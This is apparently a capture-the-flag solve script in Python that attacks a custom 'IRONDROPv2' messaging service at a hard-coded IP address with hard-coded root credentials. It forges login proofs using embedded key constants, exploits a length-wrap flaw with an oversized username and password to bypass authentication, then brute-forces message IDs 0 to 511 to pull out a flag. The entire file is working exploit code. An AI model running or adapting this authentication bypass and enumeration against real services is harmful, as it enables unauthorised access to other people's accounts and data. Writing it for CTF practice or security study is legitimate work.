#!/usr/bin/env python3
from __future__ import annotations

import hashlib
import re
import socket
import struct
from typing import List, Tuple


K1_CONST = bytes.fromhex(
    "4e04229d1f987cc40b8e954629fc2b87"
    "94b48b26524c3ab314d7d9232cdf3733"
    + "36" * 32
)
K2_CONST = bytes.fromhex(
    "246e48f775f216ae61e4ff2c439641ed"
    "fedee14c382650d97ebdb34946b55d59"
    + "5c" * 32
)
HOST = "194.102.62.175"
PORT = 26425
USERNAME = "root"
PASSWORD = "password123"


def frame(cmd: int, payload: bytes) -> bytes:
    return bytes([cmd]) + struct.pack("<H", len(payload)) + payload


def recv_pkt(sock: socket.socket) -> Tuple[int, int, bytes]:
    hdr = sock.recv(3)
    if len(hdr) < 3:
        raise RuntimeError("short header from server")
    t = hdr[0]
    ln = int.from_bytes(hdr[1:3], "little")
    data = b""
    while len(data) < ln:
        chunk = sock.recv(ln - len(data))
        if not chunk:
            break
        data += chunk
    if len(data) != ln:
        raise RuntimeError(f"short payload from server: got {len(data)} expected {ln}")
    return t, ln, data


def build_login_proof_18ec0(challenge: bytes, username: bytes, password: bytes) -> bytes:
    if len(password) > 0xFF:
        h1 = hashlib.sha256((b"\x42" * 32) + challenge).digest()
    else:
        hp = hashlib.sha256(password).digest()
        h1 = hashlib.sha256(bytes(a ^ b for a, b in zip(challenge, hp))).digest()

    core = bytes([len(username) & 0xFF]) + username + h1
    msg = challenge + core + b"IRONDROPv2"
    h2 = hashlib.sha256(K1_CONST + msg).digest()
    h3 = hashlib.sha256(K2_CONST + h2).digest()
    return core + h3[:16]


def parse_list_payload(payload: bytes) -> List[Tuple[int, str]]:
    if len(payload) < 2:
        return []
    i = 0
    count = int.from_bytes(payload[i : i + 2], "little")
    i += 2
    out: List[Tuple[int, str]] = []
    for _ in range(count):
        if i + 6 > len(payload):
            break
        msg_id = int.from_bytes(payload[i : i + 4], "little")
        i += 4
        ln = int.from_bytes(payload[i : i + 2], "little")
        i += 2
        txt = payload[i : i + ln].decode("utf-8", "ignore")
        i += ln
        out.append((msg_id, txt))
    return out


def try_extract_flag(text: str) -> str | None:
    m = re.search(r"(UVT\{[^}]+\}|flag\{[^}]+\}|[A-Z]{2,}\{[^}]+\})", text)
    return m.group(1) if m else None


def _attempt_login(host: str, port: int, username: bytes, password: bytes) -> tuple[str, List[Tuple[int, str]], socket.socket] | None:
    s = socket.create_connection((host, port), timeout=8)
    s.sendall(frame(1, struct.pack("<I", 0x00010000)))
    t, ln, challenge = recv_pkt(s)
    if t != 0x02 or ln != 32:
        s.close()
        raise RuntimeError(f"unexpected challenge response: type=0x{t:02x} len={ln}")

    proof = build_login_proof_18ec0(challenge, username, password)
    s.sendall(frame(3, proof))
    t, ln, data = recv_pkt(s)
    if t != 0x04:
        s.close()
        return None

    session = data.hex()
    s.sendall(frame(0x10, b""))
    t, ln, data = recv_pkt(s)
    if t != 0x11:
        s.close()
        return None

    entries = parse_list_payload(data)
    return session, entries, s


def _profiles(username: str, password: str) -> list[tuple[str, bytes, bytes]]:
    return [
        ("provided", username.encode(), password.encode()),
        ("len_wrap_256_longpass", b"A" * 256, b"A" * 300),
    ]


def run(host: str, port: int, username: str, password: str) -> int:
    chosen: tuple[str, str, List[Tuple[int, str]], socket.socket] | None = None
    for mode, u, p in _profiles(username, password):
        result = _attempt_login(host, port, u, p)
        if result is None:
            continue
        session, entries, s = result
        if chosen is None or len(entries) > len(chosen[2]):
            if chosen is not None:
                try:
                    chosen[3].close()
                except Exception:
                    pass
            chosen = (mode, session, entries, s)
        else:
            try:
                s.close()
            except Exception:
                pass

    if chosen is None:
        raise RuntimeError("login failed with strict native 0x18ec0 proof")

    mode, session, entries, s = chosen
    print(f"[+] authenticated: session={session} mode={mode}")
    print(f"[+] inbox entries: {len(entries)}")
    for msg_id, title in entries:
        print(f"    - id={msg_id} title={title}")

    try:
        for msg_id, _ in entries:
            s.sendall(frame(0x20, struct.pack("<I", msg_id)))
            t, ln, data = recv_pkt(s)
            if t != 0x21 or ln < 2:
                continue
            text = data[2:].decode("utf-8", "ignore")
            print(f"[+] message {msg_id}: {text}")
            flag = try_extract_flag(text)
            if flag:
                print(f"[FLAG] {flag}")
                return 0

        for msg_id in range(0, 512):
            s.sendall(frame(0x20, struct.pack("<I", msg_id)))
            t, ln, data = recv_pkt(s)
            if t != 0x21 or ln < 2:
                continue
            text = data[2:].decode("utf-8", "ignore")
            flag = try_extract_flag(text)
            if flag:
                print(f"[FLAG] {flag}")
                return 0

        print("[-] no flag found on this instance")
        return 1
    finally:
        s.close()


def main() -> int:
    return run(HOST, PORT, USERNAME, PASSWORD)


if __name__ == "__main__":
    raise SystemExit(main())
